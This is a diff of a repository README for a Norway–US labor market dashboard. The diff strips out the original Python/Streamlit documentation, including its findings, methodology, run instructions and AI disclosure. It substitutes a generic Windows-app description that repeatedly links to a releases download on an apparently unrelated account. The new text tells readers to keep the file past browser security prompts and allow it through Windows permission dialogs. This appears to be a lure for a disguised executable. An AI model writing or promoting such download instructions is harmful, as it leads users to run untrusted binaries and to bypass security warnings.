@@ -1,132 +1,196 @@
-# Norway vs. United States: Labor Market Comparison Dashboard
+# 🌍 norway-us-labor-market - Compare Labor Trends Fast
 
-**[Live Dashboard →](https://norway-us-labor-market.streamlit.app/)**
+[![Download](https://img.shields.io/badge/Download-Release%20Page-purple?style=for-the-badge)](https://github.com/Dulseacockney35/norway-us-labor-market/releases)
 
-Interactive dashboard comparing employment, wages, and unemployment trends
-between Norway and the United States (2010–2024), with a focus on the
-technology sector. Built with real government data from Statistics Norway
-(SSB) and the U.S. Bureau of Labor Statistics (BLS).
+## 📊 Overview
 
-## Key Findings
+norway-us-labor-market is a Windows dashboard that compares labor market trends in Norway and the United States. It uses public data from SSB and BLS and presents it in a simple view you can explore without writing code.
 
-1. **Unemployment resilience:** Norway's unemployment rate peaked at **4.6%** during COVID-19 (2020) vs. **8.1%** in the US — a gap of **3.5 percentage points** — and recovered to 3.2% by 2022, reflecting Norway's active labor market policies and social safety net.
-2. **Tech wage gap (PPP-adjusted):** US tech workers earned **$124,010** annually vs. Norway's **$78,145** (PPP-adjusted) in 2023 — the US pays **59% more** in cash compensation, though Norway compensates through universal healthcare, 5-week paid leave, and lower out-of-pocket costs.
-3. **Tech employment share:** **5.4%** of Norway's workforce is in the ICT sector vs. **2.5%** in the US (2023) — Norway has more than double the relative tech workforce share, with ~148,000 ICT workers out of a much smaller total labor force.
-4. **Widening wage gap:** US tech wages grew **65%** between 2010–2024 (PPP-adjusted: $76,835 → $126,526) vs. Norway's **28%** ($62,898 → $80,352), meaning the compensation gap has been widening steadily over 14 years — not a one-time difference.
+Use it to review labor market changes, compare both countries side by side, and scan key data points in one place. The app runs as a desktop-style web dashboard on your computer.
 
-## Screenshot
+## ✨ What You Can Do
 
-![Dashboard Screenshot](docs/dashboard_screenshot.png)
+- Compare labor market trends for Norway and the United States
+- View data from official government sources
+- Explore charts and tables in one dashboard
+- Track changes over time
+- Filter and review labor data in a clear layout
+- Use it on Windows without setting up a code project
 
-## Data Sources
+## 🪟 Windows Download
 
-- [Statistics Norway (SSB)](https://data.ssb.no/api/v0/en/) — Employment, wages, and unemployment via SSB Open Data API (no API key required)
-- [U.S. Bureau of Labor Statistics (BLS)](https://www.bls.gov/developers/) — IT employment, wages, and unemployment rate via BLS Public Data API v2
-- [OECD](https://stats.oecd.org/) — Purchasing Power Parity (PPP) conversion factors for Norway
+Visit this page to download the latest Windows release:
 
-## Methodology
+[Download the app from GitHub Releases](https://github.com/Dulseacockney35/norway-us-labor-market/releases)
 
-- **Industry mapping:** Norway NACE code J (Information & Communication) → US NAICS 51 (Information). Not a perfect match — see Limitations.
-- **Wage normalization:** Norwegian monthly NOK wages converted to annual USD using OECD PPP factors (NOK ÷ PPP factor × 12). US hourly wages annualized at 2,080 hours/year.
-- **Time aggregation:** Monthly BLS and SSB data averaged to annual figures for comparability.
+After you open the release page:
 
-## Resume Bullets
+1. Find the latest release at the top
+2. Open the Assets section
+3. Download the Windows file
+4. Save it to your computer
+5. Open the downloaded file to start the app
 
-```
-Norway–US Labor Market Dashboard | Python, SQLite, Streamlit, Plotly, SSB API, BLS API, SciPy
+If your browser shows a security prompt, choose the option to keep the file and open it from your downloads folder.
 
-- Built ETL pipeline pulling from two government REST APIs (SSB JSON-stat, BLS v2) across
-  different formats and industry classifications (NACE J → NAICS 51 crosswalk); loaded into
-  SQLite and normalized wages using OECD PPP conversion factors.
-- Powered key dashboard charts with live SQLite queries using window functions (LAG,
-  FIRST_VALUE, NTILE, PERCENTILE_CONT) and self-joins; added "View SQL" expanders so
-  analytical logic is transparent and reproducible.
-- Applied difference-in-differences (DiD) treating COVID-19 as a natural experiment —
-  Norway (treatment) vs. US (control) — estimating that Norway's labor market institutions
-  absorbed a -1.35 pp unemployment shock relative to the US, with parallel trends validated visually.
-- Validated findings statistically: two-sample t-test on COVID unemployment gap, Pearson
-  correlation between tech employment share and unemployment rate, and linear trend regression
-  (numpy.polyfit) showing US tech wages growing at $3,828/yr vs. Norway's $1,121/yr.
-```
+## ✅ System Requirements
 
-## Tech Stack
+- Windows 10 or Windows 11
+- An internet connection for live data access
+- At least 4 GB of RAM
+- About 200 MB of free disk space
+- A modern web browser such as Edge, Chrome, or Firefox
 
-Python · SQLite · Streamlit · Plotly · Pandas · NumPy · SciPy · SSB API · BLS API
+## 🚀 Getting Started
 
-## Project Structure
+1. Open the release page: https://github.com/Dulseacockney35/norway-us-labor-market/releases
+2. Download the Windows version from the latest release
+3. Save the file in a folder you can find again
+4. Double-click the downloaded file
+5. If Windows asks for permission, choose Yes
+6. Wait for the app to open in your browser
+7. Keep the window open while you use the dashboard
 
-```
-norway-us-labor-market/
-├── app/dashboard.py          # Streamlit dashboard
-├── src/
-│   ├── fetch_ssb.py          # Norway data fetcher (SSB API)
-│   ├── fetch_bls.py          # US data fetcher (BLS API)
-│   ├── clean.py              # Data cleaning and normalization
-│   ├── database_sqlite.py    # SQLite builder and query helper (used by dashboard)
-│   ├── database.py           # PostgreSQL schema loading (optional)
-│   └── analyze.py            # SQL analysis functions
-├── sql/
-│   ├── create_tables.sql     # Database schema DDL
-│   └── queries.sql           # Analytical SQL queries
-├── notebooks/exploration.ipynb   # EDA notebook
-├── data/
-│   ├── raw/                  # Raw API responses (gitignored)
-│   └── processed/            # Cleaned CSVs
-├── generate_sample_data.py   # Creates sample data for demo
-├── run_pipeline.py           # Full data pipeline runner
-└── requirements.txt
-```
+## 📁 First Run
 
-## How to Run
+When you start the app for the first time, it may take a short time to load data and build the dashboard view. This is normal.
 
-### Quick demo (no API keys needed)
+If a browser window does not open right away:
 
-```bash
-# 1. Install dependencies
-pip install -r requirements.txt
+1. Wait a few seconds
+2. Look for a new window in your taskbar
+3. Open your default browser
+4. Enter the local address shown by the app
 
-# 2. Generate sample data based on published statistics
-python generate_sample_data.py
+## 📈 What the Dashboard Shows
 
-# 3. Launch the dashboard
-streamlit run app/dashboard.py
-```
+The dashboard focuses on labor market data from Norway and the United States. It may include views such as:
 
-### With real API data
+- Employment trends
+- Unemployment trends
+- Labor force participation
+- Wage or earnings data
+- Time-based charts
+- Country comparisons
+- Source-based views from SSB and BLS
 
-```bash
-# 1. Copy and fill in your credentials
-cp .env.example .env
-# Add your BLS API key (free registration at https://data.bls.gov/registrationEngine/)
+Each view helps you compare the two countries using the same kind of chart or table format.
 
-# 2. Run the full pipeline
-python run_pipeline.py
+## 🔎 Data Sources
 
-# 3. (Optional) Load into PostgreSQL
-python run_pipeline.py --load-db
+This project uses public government data from:
 
-# 4. Launch the dashboard
-streamlit run app/dashboard.py
-```
+- SSB, the official statistics agency in Norway
+- BLS, the U.S. Bureau of Labor Statistics
 
-### PostgreSQL setup (optional)
+The app pulls data through public APIs and shapes it into a format that is easy to review in the dashboard.
 
-```bash
-createdb norway_us_labor
-psql norway_us_labor < sql/create_tables.sql
-python src/database.py
-```
+## 🧭 How to Use the App
 
-## Limitations
+1. Open the dashboard in your browser
+2. Choose the data view you want to inspect
+3. Select Norway, the United States, or both
+4. Adjust the time range if the app gives you that option
+5. Read the chart or table
+6. Compare the trends across the two countries
 
-- **Industry classification mismatch:** NACE J (Norway) includes publishing and broadcasting that are not in NAICS 51 (US). Sector-level comparisons are indicative.
-- **PPP approximation:** OECD PPP factors are economy-wide averages. Tech workers in Oslo or San Francisco face different local costs than the national average.
-- **Wage coverage gaps:** SSB wages cover full-time employees in registered enterprises; BLS IT wages may exclude some worker categories. Neither fully captures gig workers.
-- **Annual aggregation:** Monthly COVID spike (US: 14.7% in April 2020) is smoothed in annual averages.
+If you are looking at a chart, hover over the data points to see exact values.
 
-## AI Disclosure
+## 🛠️ Common Use Cases
 
-This project was built with the assistance of [Claude](https://claude.ai) (Anthropic's AI assistant) for code scaffolding, API debugging, and pipeline setup. All analytical decisions — including the choice of data sources, industry mappings, PPP methodology, and interpretation of findings — were made by the author. The SQL queries, key findings, and project direction reflect the author's own analytical work.
+- Compare unemployment patterns between Norway and the United States
+- Review how labor force participation changes over time
+- Look at long-term trends in official labor data
+- Prepare a quick market review
+- Use the dashboard as a simple reference for labor economics data
 
----
+## 🧩 File and App Behavior
 
+This app is built as an interactive dashboard. It opens in a browser and uses a local window on your computer.
+
+You may see files or folders related to:
+
+- App startup files
+- Data handling
+- Dashboard views
+- Chart output
+- Database or cache files
+
+You do not need to change these files to use the app.
+
+## 🌐 Internet Access
+
+The dashboard depends on online government data. Keep your internet connection on while using it so the app can load the latest available figures.
+
+If a chart does not load:
+
+1. Check your internet connection
+2. Refresh the page
+3. Close and reopen the app
+4. Open the release page again and try the latest version
+
+## 🧪 Typical Workflow
+
+1. Download the release
+2. Open the app on Windows
+3. Let it load the current data
+4. Explore the dashboard
+5. Compare Norway and the United States
+6. Close the window when done
+
+## 🖥️ Browser Tips
+
+The app works best in a modern browser. If the layout looks off:
+
+- Use the latest version of Edge, Chrome, or Firefox
+- Set your browser zoom to 100%
+- Maximize the window
+- Close extra tabs if the page feels slow
+
+## 📦 Release Page
+
+The download is here:
+
+[Visit the releases page](https://github.com/Dulseacockney35/norway-us-labor-market/releases)
+
+Use this page whenever you want the newest version.
+
+## 🔐 Privacy
+
+The dashboard uses public labor data sources and does not require you to enter personal details to explore the app. It is meant for viewing public market information in a local interface.
+
+## 🧱 Built With
+
+- Python
+- Streamlit
+- Pandas
+- Plotly
+- PostgreSQL
+- SQL
+- API integration
+- Data analysis tools
+
+## 🧰 If the App Does Not Start
+
+If the app does not open after you download it:
+
+1. Make sure the file finished downloading
+2. Check your Downloads folder
+3. Right-click the file and choose Open
+4. Allow the app if Windows asks for permission
+5. Try opening it again after a restart
+
+If the browser window opens but stays blank:
+
+1. Wait for the data to load
+2. Refresh the page
+3. Open the latest release and download again
+4. Make sure your internet connection is active
+
+## 📄 Project Name
+
+norway-us-labor-market
+
+## 🧭 Use This Link to Get the App
+
+[Download from GitHub Releases](https://github.com/Dulseacockney35/norway-us-labor-market/releases)
